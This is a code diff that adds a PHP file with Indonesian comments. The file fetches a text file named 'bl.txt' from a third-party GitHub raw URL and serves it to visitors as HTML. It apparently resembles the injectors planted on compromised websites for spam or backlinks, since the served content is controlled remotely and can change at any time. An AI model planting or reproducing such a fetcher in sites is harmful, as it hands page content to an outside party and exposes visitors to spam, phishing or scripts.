@@ -1,0 +1,16 @@
+<?php
+// URL dari file HTML yang ingin diambil
+$raw_url = "https://raw.githubusercontent.com/crayonshincan/123/refs/heads/main/bl.txt";
+
+// Mengambil konten dari URL
+$content = @file_get_contents($raw_url);
+
+// Jika gagal mengambil data, tampilkan pesan error
+if ($content === FALSE) {
+    die("Gagal mengambil konten dari URL: $raw_url");
+}
+
+// Tampilkan konten sebagai HTML
+header("Content-Type: text/html");
+echo $content;
+?>
